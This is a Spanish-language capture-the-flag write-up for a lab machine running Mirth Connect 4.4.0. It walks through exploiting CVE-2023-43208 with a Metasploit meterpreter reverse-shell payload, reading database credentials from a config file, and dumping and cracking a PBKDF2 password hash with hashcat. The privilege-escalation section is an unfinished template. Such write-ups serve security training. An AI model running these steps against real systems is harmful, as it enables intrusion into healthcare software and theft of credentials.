
# Interpreter

<figure><img src="/files/JFntbU8MqRvPbTnvUqm9" alt=""><figcaption></figcaption></figure>

## <mark style="color:$primary;">Información General</mark>

* **Nombre de la máquina:** `Interpreter`
* **IP:** `10.129.72.42`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟡 Media`
* **Fecha:** `DD-MM-AAAA`

***

## <mark style="color:$primary;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.129.72.42 interpreter.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

```bash
sudo nmap -v -sV -T5 10.129.72.42
```

```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp  open  http     Jetty
443/tcp open  ssl/http Jetty
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Encontramos 3 puertos abiertos en la máquina. Nos centraremos en el servicio web.

### Acceso Web

Accedemos a `http://interpreter.htb` y observamos una plataforma NextGen Healthcare | Mirth Connect, lo que parece de servicios sanitarios:

<figure><img src="/files/AWRxOcjucmpEzRMWxcu2" alt=""><figcaption></figcaption></figure>

#### Login

Tenemos un login sin posibilidad de registrarnos:

<figure><img src="/files/F1kxtM8vLvd8RkH3YCBr" alt=""><figcaption></figcaption></figure>

Al poner un usuario no válido nos da el error: `Invalid login credentials`.

### Connect Administrator

Al pulsar en el botón Launch Mirth Connect Administrator nos descarga un archivo webstart.jnlp que contiene la versión de la aplicación: `Mirth Connect Administrator 4.4.0`

{% code overflow="wrap" %}

```html
jnlp codebase="https://interpreter.htb:443" version="4.4.0">
    <information>
        <title>Mirth Connect Administrator 4.4.0</title>
        <vendor>NextGen Healthcare</vendor>
        <homepage href="http://www.nextgen.com"/>
        <description>Open Source Healthcare Integration Engine</description>
        <----SNIP---->
```

{% endcode %}

Eso nos permitiría buscar exploits públicos.

***

## <mark style="color:$primary;">Enumeración Web</mark>

### WSTG Scan

{% embed url="<https://github.com/afsh4ck/WSTG-Scan>" %}

Este programa automáticamente realiza:

* Enumeración de tecnologías web
* Escaneo de puertos y servicios con Nmap
* Análisis de vulnerabilidades con Nuclei
* Fuzzing de subdominios con ffuf
* Fuzzing de directorios con fuff
* Spidering / Mapeo completo del site
* Detección de formularios y pruebas de inyección
* Pruebas de API (OWASP API Top 10)
* Enumeración de usuarios y bruteforce con hydra

{% code overflow="wrap" %}

```bash
git clone https://github.com/afsh4ck/WSTG-Scan.git
cd WSTG-Scan
python3 wstg-scan.py
```

{% endcode %}

### Hallazgos relevantes

***

## <mark style="color:$primary;">Explotación</mark>

Encontramos el siguiente PoC para explotar esta versión `4.4.0` de Mirth Connect:

{% embed url="<https://medium.com/@rahulravi.hulli/enumerating-the-rce-vulnerability-on-mirth-connect-4-4-0-24424258a3b5>" %}

### Metasploit

Encontramos un módulo dedicado para explotarlo:

```bash
msf6 > search mirth

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/multi/http/mirth_connect_cve_2023_43208  2023-10-25       excellent  Yes    Mirth Connect Deserialization RCE
   1    \_ target: Unix Command                        .                .          .      .
   2    \_ target: Windows Command                     .                .          .      .


Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/mirth_connect_cve_2023_43208
After interacting with a module you can manually set a TARGET with set TARGET 'Windows Command'

msf6 > use 0
```

{% code overflow="wrap" %}

```bash
set rhosts 10.129.72.49
set lhost tun0
set rport 443
set payload cmd/unix/python/meterpreter_reverse_tcp
exploit

[*] Started reverse TCP handler on 10.10.14.41:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version 4.4.0 is affected by CVE-2023-43208.
[*] Executing cmd/unix/python/meterpreter_reverse_tcp (Unix Command)
[+] The target appears to have executed the payload.
[*] Meterpreter session 1 opened (10.10.14.41:4444 -> 10.129.72.49:40804) at 2026-05-19 03:53:04 +0800

meterpreter > getuid
Server username: mirth
```

{% endcode %}

Tenemos un meterpreter! Pero no podemos acceder al directorio sedric en /home donde se encuentra la user flag:

{% code overflow="wrap" %}

```bash
mirth@interpreter:/home$ ls
sedric
mirth@interpreter:/home$ cd sedric
bash: cd: sedric: Permission denied
```

{% endcode %}

***

## <mark style="color:$primary;">Enumeración interna</mark>

### Archivo de configuración

{% code overflow="wrap" %}

```bash
mirth@interpreter:/var$ cat /usr/local/mirthconnect/conf/mirth.properties

# Mirth Connect configuration file

# directories
dir.appdata = /var/lib/mirthconnect
dir.tempdata = ${dir.appdata}/temp

# ports
http.port = 80
https.port = 443

# Only used for migration purposes, do not modify
version = 4.4.0

# keystore
keystore.path = ${dir.appdata}/keystore.jks
keystore.storepass = 5GbU5HGTOOgE
keystore.keypass = tAuJfQeXdnPw
keystore.type = JCEKS

database = mysql

# examples:
#   Derby                       jdbc:derby:${dir.appdata}/mirthdb;create=true
#   PostgreSQL                  jdbc:postgresql://localhost:5432/mirthdb
#   MySQL                       jdbc:mysql://localhost:3306/mirthdb
#   Oracle                      jdbc:oracle:thin:@localhost:1521:DB
#   SQL Server/Sybase (jTDS)    jdbc:jtds:sqlserver://localhost:1433/mirthdb
#   Microsoft SQL Server        jdbc:sqlserver://localhost:1433;databaseName=mirthdb
#   If you are using the Microsoft SQL Server driver, please also specify database.driver below 
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod

# If using a custom or non-default driver, specify it here.
# example:
# Microsoft SQL server: database.driver = com.microsoft.sqlserver.jdbc.SQLServerDriver
# (Note: the jTDS driver is used by default for sqlserver)
database.driver = org.mariadb.jdbc.Driver

# Maximum number of connections allowed for the main read/write connection pool
database.max-connections = 20
# Maximum number of connections allowed for the read-only connection pool
database-readonly.max-connections = 20

# database credentials
database.username = mirthdb
database.password = MirthPass123!
```

{% endcode %}

Encontramos credenciales para acceder a la base de datos!

### Enumeración de la base de datos

{% code overflow="wrap" %}

```sql
mirth@interpreter:/$ mysql -u mirthdb -pMirthPass123! -h localhost mc_bdd_prod

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 36
Server version: 10.11.14-MariaDB-0+deb12u2 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [mc_bdd_prod]> show tables;
+-----------------------+
| Tables_in_mc_bdd_prod |
+-----------------------+
| ALERT                 |
| CHANNEL               |
| CHANNEL_GROUP         |
| CODE_TEMPLATE         |
| CODE_TEMPLATE_LIBRARY |
| CONFIGURATION         |
| DEBUGGER_USAGE        |
| D_CHANNELS            |
| D_M1                  |
| D_MA1                 |
| D_MC1                 |
| D_MCM1                |
| D_MM1                 |
| D_MS1                 |
| D_MSQ1                |
| EVENT                 |
| PERSON                |
| PERSON_PASSWORD       |
| PERSON_PREFERENCE     |
| SCHEMA_INFO           |
| SCRIPT                |
+-----------------------+
21 rows in set (0.001 sec)
```

{% endcode %}

Encontramos 2 tablas de usuarios interesantes, y encontramos el hash del usuario sedric:

```sql
MariaDB [mc_bdd_prod]> select * from PERSON;
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
| ID | USERNAME | FIRSTNAME | LASTNAME | ORGANIZATION | INDUSTRY | EMAIL | PHONENUMBER | DESCRIPTION | LAST_LOGIN          | GRACE_PERIOD_START | STRIKE_COUNT | LAST_STRIKE_TIME | LOGGED_IN | ROLE | COUNTRY       | STATETERRITORY | USERCONSENT |
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
|  2 | sedric   |           |          |              | NULL     |       |             |             | 2025-09-21 17:56:02 | NULL               |            0 | NULL             |           | NULL | United States | NULL           |           0 |
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
1 row in set (0.000 sec)

MariaDB [mc_bdd_prod]> select * from PERSON_PASSWORD;
+-----------+----------------------------------------------------------+---------------------+
| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
+-----------+----------------------------------------------------------+---------------------+
|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |
+-----------+----------------------------------------------------------+---------------------+
1 row in set (0.003 sec)
```

Ahora necesitamos conocer su tipo de cifrado para encontrar la manera de obtener la contraseña en texto plano.

La página [de la Guía de actualización](https://github.com/nextgenhealthcare/connect/wiki/4.4.0---Upgrade-Guide) de nextgenhealthcare indica que el algoritmo hash se ha cambiado de `SHA256` a `PBKDF2WithHmacSHA256` en la versión 4.4.0.

<figure><img src="/files/r3XT7aMI5HtWNGEq3SVC" alt=""><figcaption></figcaption></figure>

El objetivo es ralentizar los ataques de fuerza bruta, ya que los hashes de contraseñas se repiten muchas veces (iteraciones). En Mirth 4.4, el número de iteraciones aumentó de 1000 a 600000, lo que significa que aplica el hash SHA256 600000 veces antes de guardar la contraseña.

Lea el código fuente en su página principal de GitHub: <https://github.com/nextgenhealthcare/connect> . El código de cifrado de contraseña se encuentra en `server/src/com/mirth/connect/server/util/Pre22PasswordChecker.java`

```java
package com.mirth.connect.server.util;

import java.util.Arrays;

import org.apache.commons.codec.binary.Base64;
import org.apache.commons.codec.digest.DigestUtils;
import org.apache.commons.lang3.ArrayUtils;
import org.apache.commons.lang3.StringUtils;

public class Pre22PasswordChecker {
    private static final int SALT_LENGTH = 12;
    private static final String SALT_PREFIX = "SALT_";

    /**
     * The pre-2.2 password has been migrated to the following format:
     * 
     * SALT_ + 8-bit salt + base64(sha(salt + password))
```

### Cracking de hash

#### 1. Decodificar el hash a hexadecimal

```bash
mirth@interpreter:/$ python3 -c "import base64; h='u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w=='; b=base64.b64decode(h); print(b.hex())"

bbff8b0413949da762c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb
```

Separamos: **salt** = `bbff8b0413949da7` (16 hex), **hash** = `62c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb` (64 hex).

Crea un archivo `hash.txt` con el siguiente contenido (formato `hash:salt`):

```
62c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb:bbff8b0413949da7
```

Aunque se ha añadido protección contra ataques de fuerza bruta, si la contraseña es lo suficientemente débil y la máquina comprometida es lo suficientemente potente, es totalmente posible obtener la contraseña.

Utilicé hashcat con el modo 10900 y encontré el siguiente formato de hash.

<figure><img src="/files/IWh1NfqwFabZ8FYfbclW" alt=""><figcaption></figcaption></figure>

### Extraer valores correctos

Podemos usar el siguente script:

```python
import base64
full = base64.b64decode('u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==')
salt = full[:8]
digest = full[8:]
print(base64.b64encode(salt).decode())
print(base64.b64encode(digest).decode())
```

```bash
python3 hash.py
       
u/+LBBOUnac=
YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

Tras combinar, obtenemos el hash:

```
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

#### Cracking con hashcat

```bash
hashcat -m 10900 hash /usr/share/wordlists/rockyou.txt

sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD...Ld8Ps=
Time.Started.....: Tue May 19 04:44:49 2026 (4 mins, 39 secs)
Time.Estimated...: Tue May 19 04:49:28 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       44 H/s (26.87ms) @ Accel:256 Loops:128 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 12288/14344385 (0.09%)
```

Tenemos la contraseña en plano!

***

## <mark style="color:$primary;">User Flag</mark>

```bash
mirth@interpreter:/$ su sedric
Password: 
sedric@interpreter:/$ cd /home/sedric/
sedric@interpreter:~$ ls
user.txt
sedric@interpreter:~$ cat user.txt 
ef102ffa23e41eea8e56d6ec********
```

***

## <mark style="color:$primary;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

No tenemos sudo disponible en la máquina:

```bash
sedric@interpreter:~$ sudo -l
bash: sudo: command not found
```

### Ver servicios internos corriendo

```bash
sedric@interpreter:~$ ss -tuln

Netid         State          Recv-Q          Send-Q                   Local Address:Port                    Peer Address:Port         Process         
udp           UNCONN         0               0                              0.0.0.0:68                           0.0.0.0:*                            
tcp           LISTEN         0               128                          127.0.0.1:54321                        0.0.0.0:*                            
tcp           LISTEN         0               80                           127.0.0.1:3306                         0.0.0.0:*                            
tcp           LISTEN         0               256                            0.0.0.0:6661                         0.0.0.0:*                            
tcp           LISTEN         0               50                             0.0.0.0:443                          0.0.0.0:*                            
tcp           LISTEN         0               50                             0.0.0.0:80                           0.0.0.0:*                            
tcp           LISTEN         0               128                            0.0.0.0:22                           0.0.0.0:*                            
tcp           LISTEN         0               128                               [::]:22                              [::]:*  
```

Observamos que hay una aplicación sospechosa corriendo por el puerto 54321 y por el 6661, puertos que no se suelen utilizar normalmente.

#### Técnica aplicada

Describir la técnica usada: binario con SUID, cronjob mal configurado, credenciales duras, etc.

***

## <mark style="color:$primary;">👑</mark> <mark style="color:$primary;">Root Flag</mark>

```bash
cat /root/root.txt
```
